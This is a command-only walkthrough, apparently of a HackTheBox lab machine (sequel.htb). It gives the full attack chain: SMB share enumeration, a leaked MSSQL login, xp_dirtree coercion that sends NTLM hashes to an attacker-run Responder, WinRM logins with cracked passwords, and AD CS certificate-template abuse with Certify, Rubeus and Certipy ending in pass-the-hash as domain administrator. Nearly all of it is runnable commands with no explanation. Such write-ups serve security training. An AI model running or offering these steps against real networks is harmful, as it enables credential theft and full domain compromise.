```
nmap -sS -sC -sV -T5 -Pn 10.10.11.202
smbclient -L \\\\10.10.11.202\\
smbclient \\\\10.10.11.202\\Public
python3 -m http.server 80
http://10.10.14.6/SQL%20Server%20Procedures.pdf
./kerbrute_linux_amd64 userenum --dc 10.10.11.202 -d sequel.htb users_0
impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202
responder -I tun0 -v
EXEC MASTER.sys.xp_dirtree '\\10.10.14.6\test', 1, 1
crackmapexec winrm 10.10.11.202 -u users_3 -p REGGIE1234ronnie --continue-on-success
evil-winrm -i 10.10.11.202 -u sql_svc -p REGGIE1234ronnie
upload winPEASany.exe
./winPEASany.exe
type C:\sqlserver\Logs\ERRORLOG.bak
crackmapexec winrm 10.10.11.202 -u Ryan.Cooper -p NuclearMosquito3
evil-winrm -i 10.10.11.202 -u Ryan.Cooper -p NuclearMosquito3
Download Certify.exe https://github.com/Flangvik/SharpCollection/tree/master/NetFramework_4.7_Any
upload Certify.exe
.\Certify.exe find /vulnerable /currentuser
.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
upload cert.pfx
.\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx
.\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx /getcredentials /show /nowrap
evil-winrm -i 10.10.11.202 -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
git clone https://github.com/ly4k/Certipy.git
python3 setup.py install
certipy req -username Ryan.Cooper@sequel.htb -password NuclearMosquito3 -ca sequel-DC-CA -target 10.10.11.202 -template UserAuthentication -upn Administrator@sequel.htb -dns dc.sequel.htb -debug
certipy auth -pfx administrator_dc.pfx -dc-ip 10.10.11.202
sudo service virtualbox-guest-utils stop
sudo ntpdate -s 10.10.11.202
certipy auth -pfx administrator_dc.pfx -dc-ip 10.10.11.202
evil-winrm -i 10.10.11.202 -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
```



```
nmap -sS -sC -sV -T5 -Pn 10.10.11.202
dc.sequel.htb
```
![image](https://github.com/user-attachments/assets/9263ebf5-8f7b-407d-baa3-e3a46e8540af)

```
smbclient -L \\\\10.10.11.202\\
smbclient \\\\10.10.11.202\\Public
```
![image](https://github.com/user-attachments/assets/f31422ee-e143-4d2a-bef8-505127c28203)

```
python3 -m http.server 80
http://10.10.14.6/SQL%20Server%20Procedures.pdf
PublicUser | GuestUserCantWrite1
```
![image](https://github.com/user-attachments/assets/dd949602-8c3c-435d-b04e-0dc1ecb8d7ff)

```
./kerbrute_linux_amd64 userenum --dc 10.10.11.202 -d sequel.htb users_0
```
![image](https://github.com/user-attachments/assets/53c9d8de-3ef7-4c76-a88d-b3c09f6caa53)

```
impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202
```
![image](https://github.com/user-attachments/assets/c4f31852-f910-4641-a631-8489f6023ac7)

```
responder -I tun0 -v
EXEC MASTER.sys.xp_dirtree '\\10.10.14.6\test', 1, 1
REGGIE1234ronnie (sql_svc)
```
![image](https://github.com/user-attachments/assets/bb0b8250-4cd0-463a-8fd9-0bd1882b66c2)

![image](https://github.com/user-attachments/assets/eabb3ae2-1343-47d2-8742-7f235c1acd67)

```
crackmapexec winrm 10.10.11.202 -u users_3 -p REGGIE1234ronnie --continue-on-success
evil-winrm -i 10.10.11.202 -u sql_svc -p REGGIE1234ronnie
```
![image](https://github.com/user-attachments/assets/a62a4cdd-c228-493f-8bde-caa93695ebca)

![image](https://github.com/user-attachments/assets/78b2d28d-f869-4b04-8b55-2ec48b8db114)

```
upload winPEASany.exe
./winPEASany.exe
```
![image](https://github.com/user-attachments/assets/170c7e63-ac22-43db-896d-fae7a896190b)

```
type C:\sqlserver\Logs\ERRORLOG.bak
```
![image](https://github.com/user-attachments/assets/53099c6d-e9cb-4d4a-8606-fa52dea217f3)

![image](https://github.com/user-attachments/assets/cd62b77f-eaad-4fbc-9e40-d95f595cb14e)

```
crackmapexec winrm 10.10.11.202 -u Ryan.Cooper -p NuclearMosquito3
```
![image](https://github.com/user-attachments/assets/bb11ad81-6b7a-4469-a77a-b9f5db898f5a)

```
evil-winrm -i 10.10.11.202 -u Ryan.Cooper -p NuclearMosquito3
```
![image](https://github.com/user-attachments/assets/95b9055c-951e-4a11-855b-ee410f182df7)

```
Download Certify.exe https://github.com/Flangvik/SharpCollection/tree/master/NetFramework_4.7_Any
upload Certify.exe
.\Certify.exe find /vulnerable /currentuser
```
![image](https://github.com/user-attachments/assets/291c9e18-5898-42e1-af69-1827741ff159)

![image](https://github.com/user-attachments/assets/982539d6-95a6-4b91-8d6a-9c1b6c695ca4)

```
.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator
```
![image](https://github.com/user-attachments/assets/2a436b62-2ab5-48d8-94f7-4b6af84b6493)

```
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Enter no password
```
![image](https://github.com/user-attachments/assets/0bde621d-fe4b-493d-9f38-3ece278b7e9b)

```
upload cert.pfx
.\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx
```
![image](https://github.com/user-attachments/assets/6a4ab877-c5ea-4fef-9ce5-4da8f5eee66a)

```
.\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx /getcredentials /show /nowrap
```
![image](https://github.com/user-attachments/assets/39fbe789-1258-426c-ae50-07de66d154c6)


```
evil-winrm -i 10.10.11.202 -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
```
![image](https://github.com/user-attachments/assets/9a786f1d-7388-4793-9eb6-318c435f64df)

# OR1
```
git clone https://github.com/ly4k/Certipy.git
python3 setup.py install
Certipy
```
![image](https://github.com/user-attachments/assets/1bf7e649-bcca-4ca8-9648-5670bfe5b0ed)

```
certipy req -username Ryan.Cooper@sequel.htb -password NuclearMosquito3 -ca sequel-DC-CA -target 10.10.11.202 -template UserAuthentication -upn Administrator@sequel.htb -dns dc.sequel.htb -debug
certipy auth -pfx administrator_dc.pfx -dc-ip 10.10.11.202
```
![image](https://github.com/user-attachments/assets/801fdd01-029e-4076-b95c-ae91c65661a7)

```
sudo service virtualbox-guest-utils stop
sudo ntpdate -s 10.10.11.202
certipy auth -pfx administrator_dc.pfx -dc-ip 10.10.11.202
```
![image](https://github.com/user-attachments/assets/1327812c-7770-4ad0-bddf-bf280b2d149d)

```
evil-winrm -i 10.10.11.202 -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
```
![image](https://github.com/user-attachments/assets/2f8c2ee8-2536-4e1f-87dc-2628f7ee26e2)

# OR2
```
certipy req -u ryan.cooper -p NuclearMosquito3 -target 10.10.11.202 -upn administrator@sequel.htb -ca sequel-dc-ca -template UserAuthentication
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.202
```
![image](https://github.com/user-attachments/assets/165e8554-4d93-4dca-8b36-1b5cb4191337)
